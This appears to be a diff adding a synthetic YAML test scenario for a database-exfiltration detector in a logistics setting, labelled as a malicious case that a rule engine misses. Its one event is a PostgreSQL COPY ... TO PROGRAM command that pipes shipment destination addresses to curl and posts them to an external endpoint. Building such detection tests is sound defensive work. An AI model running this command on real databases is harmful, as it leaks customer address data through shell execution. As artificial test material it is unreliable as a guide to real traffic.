@@ -1,0 +1,30 @@
+scenario_id: gen_logistics_36_copy_to_program_mal_936m
+family_id: gen_logistics_36_copy_to_program_fam_936
+domain: logistics
+time_of_day: 03:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT dest_address FROM shipments) TO PROGRAM 'curl -sX POST https://reports.corp/ingest
+      -d @-'
+    connects_to:
+      ip: 10.79.40.155
+      port: 8443
+matched_pair_id: gen_logistics_36_copy_to_program_pair_936
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
